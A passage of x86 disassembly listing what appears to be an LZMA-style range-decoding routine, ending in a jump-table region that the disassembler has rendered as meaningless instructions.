  40726c:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  40726f:	40                   	inc    %eax
  407270:	33 d2                	xor    %edx,%edx
  407272:	f7 75 8c             	divl   -0x74(%ebp)
  407275:	8b 45 98             	mov    -0x68(%ebp),%eax
  407278:	ff 45 98             	incl   -0x68(%ebp)
  40727b:	ff 4d 9c             	decl   -0x64(%ebp)
  40727e:	ff 4d d0             	decl   -0x30(%ebp)
  407281:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
  407285:	88 08                	mov    %cl,(%eax)
  407287:	89 55 ec             	mov    %edx,-0x14(%ebp)
  40728a:	7f bc                	jg     0x407248
  40728c:	e9 78 fd ff ff       	jmp    0x407009
  407291:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  407295:	75 20                	jne    0x4072b7
  407297:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  40729a:	83 65 d0 00          	andl   $0x0,-0x30(%ebp)
  40729e:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  4072a1:	c1 e0 04             	shl    $0x4,%eax
  4072a4:	8d 44 01 04          	lea    0x4(%ecx,%eax,1),%eax
  4072a8:	89 45 a8             	mov    %eax,-0x58(%ebp)
  4072ab:	c7 45 c0 03 00 00 00 	movl   $0x3,-0x40(%ebp)
  4072b2:	e9 ce 00 00 00       	jmp    0x407385
  4072b7:	8b 45 a8             	mov    -0x58(%ebp),%eax
  4072ba:	c7 85 7c ff ff ff 13 	movl   $0x13,-0x84(%ebp)
  4072c1:	00 00 00 
  4072c4:	8d 70 02             	lea    0x2(%eax),%esi
  4072c7:	89 75 ac             	mov    %esi,-0x54(%ebp)
  4072ca:	66 8b 06             	mov    (%esi),%ax
  4072cd:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4072d0:	0f b7 d0             	movzwl %ax,%edx
  4072d3:	c1 e9 0b             	shr    $0xb,%ecx
  4072d6:	0f af ca             	imul   %edx,%ecx
  4072d9:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  4072dc:	73 18                	jae    0x4072f6
  4072de:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4072e1:	b9 00 08 00 00       	mov    $0x800,%ecx
  4072e6:	2b ca                	sub    %edx,%ecx
  4072e8:	c1 f9 05             	sar    $0x5,%ecx
  4072eb:	03 c8                	add    %eax,%ecx
  4072ed:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  4072f1:	66 89 0e             	mov    %cx,(%esi)
  4072f4:	eb 19                	jmp    0x40730f
  4072f6:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  4072f9:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  4072fc:	66 8b c8             	mov    %ax,%cx
  4072ff:	c7 45 c0 01 00 00 00 	movl   $0x1,-0x40(%ebp)
  407306:	66 c1 e9 05          	shr    $0x5,%cx
  40730a:	2b c1                	sub    %ecx,%eax
  40730c:	66 89 06             	mov    %ax,(%esi)
  40730f:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  407316:	73 25                	jae    0x40733d
  407318:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  40731c:	0f 84 a9 01 00 00    	je     0x4074cb
  407322:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  407325:	8b 45 f4             	mov    -0xc(%ebp),%eax
  407328:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  40732c:	0f b6 09             	movzbl (%ecx),%ecx
  40732f:	ff 4d 94             	decl   -0x6c(%ebp)
  407332:	c1 e0 08             	shl    $0x8,%eax
  407335:	0b c1                	or     %ecx,%eax
  407337:	ff 45 90             	incl   -0x70(%ebp)
  40733a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40733d:	8b 85 7c ff ff ff    	mov    -0x84(%ebp),%eax
  407343:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  407349:	e9 91 f7 ff ff       	jmp    0x406adf
  40734e:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  407352:	75 1c                	jne    0x407370
  407354:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  407357:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  40735a:	c1 e0 04             	shl    $0x4,%eax
  40735d:	c7 45 d0 08 00 00 00 	movl   $0x8,-0x30(%ebp)
  407364:	8d 84 01 04 01 00 00 	lea    0x104(%ecx,%eax,1),%eax
  40736b:	e9 38 ff ff ff       	jmp    0x4072a8
  407370:	81 45 a8 04 02 00 00 	addl   $0x204,-0x58(%ebp)
  407377:	c7 45 d0 10 00 00 00 	movl   $0x10,-0x30(%ebp)
  40737e:	c7 45 c0 08 00 00 00 	movl   $0x8,-0x40(%ebp)
  407385:	c7 45 84 14 00 00 00 	movl   $0x14,-0x7c(%ebp)
  40738c:	8b 45 c0             	mov    -0x40(%ebp),%eax
  40738f:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%ebp)
  407396:	89 45 b8             	mov    %eax,-0x48(%ebp)
  407399:	eb 28                	jmp    0x4073c3
  40739b:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  40739f:	0f 84 32 01 00 00    	je     0x4074d7
  4073a5:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  4073a8:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4073ab:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  4073af:	0f b6 09             	movzbl (%ecx),%ecx
  4073b2:	ff 4d 94             	decl   -0x6c(%ebp)
  4073b5:	c1 e0 08             	shl    $0x8,%eax
  4073b8:	0b c1                	or     %ecx,%eax
  4073ba:	ff 45 90             	incl   -0x70(%ebp)
  4073bd:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4073c0:	ff 4d b8             	decl   -0x48(%ebp)
  4073c3:	83 7d b8 00          	cmpl   $0x0,-0x48(%ebp)
  4073c7:	7e 5e                	jle    0x407427
  4073c9:	8b 45 b0             	mov    -0x50(%ebp),%eax
  4073cc:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4073cf:	c1 e9 0b             	shr    $0xb,%ecx
  4073d2:	8d 14 00             	lea    (%eax,%eax,1),%edx
  4073d5:	8b 45 a8             	mov    -0x58(%ebp),%eax
  4073d8:	8d 34 02             	lea    (%edx,%eax,1),%esi
  4073db:	89 75 ac             	mov    %esi,-0x54(%ebp)
  4073de:	66 8b 06             	mov    (%esi),%ax
  4073e1:	0f b7 f8             	movzwl %ax,%edi
  4073e4:	0f af cf             	imul   %edi,%ecx
  4073e7:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  4073ea:	73 17                	jae    0x407403
  4073ec:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4073ef:	b9 00 08 00 00       	mov    $0x800,%ecx
  4073f4:	2b cf                	sub    %edi,%ecx
  4073f6:	c1 f9 05             	sar    $0x5,%ecx
  4073f9:	03 c8                	add    %eax,%ecx
  4073fb:	d1 65 b0             	shll   $1,-0x50(%ebp)
  4073fe:	66 89 0e             	mov    %cx,(%esi)
  407401:	eb 16                	jmp    0x407419
  407403:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  407406:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  407409:	66 8b c8             	mov    %ax,%cx
  40740c:	66 c1 e9 05          	shr    $0x5,%cx
  407410:	2b c1                	sub    %ecx,%eax
  407412:	42                   	inc    %edx
  407413:	66 89 06             	mov    %ax,(%esi)
  407416:	89 55 b0             	mov    %edx,-0x50(%ebp)
  407419:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  407420:	73 9e                	jae    0x4073c0
  407422:	e9 74 ff ff ff       	jmp    0x40739b
  407427:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  40742a:	8b 5d b0             	mov    -0x50(%ebp),%ebx
  40742d:	33 c0                	xor    %eax,%eax
  40742f:	40                   	inc    %eax
  407430:	d3 e0                	shl    %cl,%eax
  407432:	2b d8                	sub    %eax,%ebx
  407434:	8b 45 84             	mov    -0x7c(%ebp),%eax
  407437:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  40743a:	e9 04 ff ff ff       	jmp    0x407343
  40743f:	01 5d d0             	add    %ebx,-0x30(%ebp)
  407442:	8b 45 80             	mov    -0x80(%ebp),%eax
  407445:	e9 f9 fe ff ff       	jmp    0x407343
  40744a:	c7 85 78 ff ff ff 01 	movl   $0x1,-0x88(%ebp)
  407451:	00 00 00 
  407454:	e9 88 00 00 00       	jmp    0x4074e1
  407459:	c7 85 78 ff ff ff 03 	movl   $0x3,-0x88(%ebp)
  407460:	00 00 00 
  407463:	eb 7c                	jmp    0x4074e1
  407465:	c7 85 78 ff ff ff 0d 	movl   $0xd,-0x88(%ebp)
  40746c:	00 00 00 
  40746f:	eb 70                	jmp    0x4074e1
  407471:	c7 85 78 ff ff ff 0e 	movl   $0xe,-0x88(%ebp)
  407478:	00 00 00 
  40747b:	eb 64                	jmp    0x4074e1
  40747d:	c7 85 78 ff ff ff 0f 	movl   $0xf,-0x88(%ebp)
  407484:	00 00 00 
  407487:	eb 58                	jmp    0x4074e1
  407489:	c7 85 78 ff ff ff 1a 	movl   $0x1a,-0x88(%ebp)
  407490:	00 00 00 
  407493:	eb 4c                	jmp    0x4074e1
  407495:	c7 85 78 ff ff ff 1b 	movl   $0x1b,-0x88(%ebp)
  40749c:	00 00 00 
  40749f:	eb 40                	jmp    0x4074e1
  4074a1:	c7 85 78 ff ff ff 0c 	movl   $0xc,-0x88(%ebp)
  4074a8:	00 00 00 
  4074ab:	eb 34                	jmp    0x4074e1
  4074ad:	c7 85 78 ff ff ff 10 	movl   $0x10,-0x88(%ebp)
  4074b4:	00 00 00 
  4074b7:	eb 28                	jmp    0x4074e1
  4074b9:	83 4d d0 ff          	orl    $0xffffffff,-0x30(%ebp)
  4074bd:	eb 22                	jmp    0x4074e1
  4074bf:	c7 85 78 ff ff ff 1c 	movl   $0x1c,-0x88(%ebp)
  4074c6:	00 00 00 
  4074c9:	eb 16                	jmp    0x4074e1
  4074cb:	c7 85 78 ff ff ff 05 	movl   $0x5,-0x88(%ebp)
  4074d2:	00 00 00 
  4074d5:	eb 0a                	jmp    0x4074e1
  4074d7:	c7 85 78 ff ff ff 18 	movl   $0x18,-0x88(%ebp)
  4074de:	00 00 00 
  4074e1:	8b bd 70 ff ff ff    	mov    -0x90(%ebp),%edi
  4074e7:	6a 22                	push   $0x22
  4074e9:	59                   	pop    %ecx
  4074ea:	8d b5 78 ff ff ff    	lea    -0x88(%ebp),%esi
  4074f0:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4074f2:	33 c0                	xor    %eax,%eax
  4074f4:	eb 03                	jmp    0x4074f9
  4074f6:	83 c8 ff             	or     $0xffffffff,%eax
  4074f9:	5f                   	pop    %edi
  4074fa:	5e                   	pop    %esi
  4074fb:	5b                   	pop    %ebx
  4074fc:	c9                   	leave
  4074fd:	c3                   	ret
  4074fe:	f5                   	cmc
  4074ff:	6a 40                	push   $0x40
  407501:	00 9a 6b 40 00 35    	add    %bl,0x3500406b(%edx)
  407507:	6c                   	insb   (%dx),%es:(%edi)
  407508:	40                   	inc    %eax
  407509:	00 0a                	add    %cl,(%edx)
  40750b:	6c                   	insb   (%dx),%es:(%edi)
  40750c:	40                   	inc    %eax
  40750d:	00 ca                	add    %cl,%dl
  40750f:	72 40                	jb     0x407551
  407511:	00 18                	add    %bl,(%eax)
  407513:	73 40                	jae    0x407555
  407515:	00 5b 6c             	add    %bl,0x6c(%ebx)
  407518:	40                   	inc    %eax
  407519:	00 fa                	add    %bh,%dl
  40751b:	6e                   	outsb  %ds:(%esi),(%dx)
  40751c:	40                   	inc    %eax
  40751d:	00 64 6f 40          	add    %ah,0x40(%edi,%ebp,2)
  407521:	00 a7 6f 40 00 18    	add    %ah,0x1800406f(%edi)
  407527:	70 40                	jo     0x407569
  407529:	00 3f                	add    %bh,(%edi)
  40752b:	70 40                	jo     0x40756d
  40752d:	00 ff                	add    %bh,%bh
  40752f:	70 40                	jo     0x407571
  407531:	00 f4                	add    %dh,%ah
  407533:	6c                   	insb   (%dx),%es:(%edi)
  407534:	40                   	inc    %eax
  407535:	00 ad 6d 40 00 71    	add    %ch,0x7100406d(%ebp)
  40753b:	6e                   	outsb  %ds:(%esi),(%dx)
  40753c:	40                   	inc    %eax
  40753d:	00 82 71 40 00 52    	add    %al,0x52004071(%edx)
  407543:	6f                   	outsl  %ds:(%esi),(%dx)
  407544:	40                   	inc    %eax
  407545:	00 91 72 40 00 4e    	add    %dl,0x4e004072(%ecx)
  40754b:	73 40                	jae    0x40758d
  40754d:	00 3f                	add    %bh,(%edi)
  40754f:	74 40                	je     0x407591
  407551:	00 79 70             	add    %bh,0x70(%ecx)
  407554:	40                   	inc    %eax
  407555:	00 90 70 40 00 8c    	add    %dl,-0x73ffbf90(%eax)
  40755b:	73 40                	jae    0x40759d
  40755d:	00 9b 73 40 00 be    	add    %bl,-0x41ffbf8d(%ebx)
  407563:	70 40                	jo     0x4075a5
  407565:	00 40 6e             	add    %al,0x6e(%eax)
  407568:	40                   	inc    %eax
  407569:	00 cb                	add    %cl,%bl
  40756b:	6f                   	outsl  %ds:(%esi),(%dx)
  40756c:	40                   	inc    %eax
  40756d:	00 48 72             	add    %cl,0x72(%eax)
  407570:	40                   	inc    %eax
	...
